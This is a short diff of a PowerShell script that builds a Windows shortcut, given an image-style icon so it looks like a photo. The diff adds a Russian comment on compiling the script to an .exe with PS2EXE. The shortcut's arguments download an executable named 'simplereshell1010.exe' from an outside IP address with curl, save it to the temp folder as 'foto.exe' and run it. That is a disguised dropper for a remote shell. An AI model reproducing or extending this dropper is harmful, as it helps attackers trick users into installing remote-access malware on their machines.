@@ -8,3 +8,7 @@ create lnk
     $l.Arguments = "/c curl -o %temp%\foto.exe http://100.100.31.64:8081/simplereshell1010.exe && start %temp%\foto.exe"
     $l.IconLocation = "%windir%\system32\imageres.dll, 100"
     $l.Save()
+
+
+# С помощью утилиты https://github.com/MScholtes/PS2EXE создать .exe
+        https://github.com/MScholtes/PS2EXE 
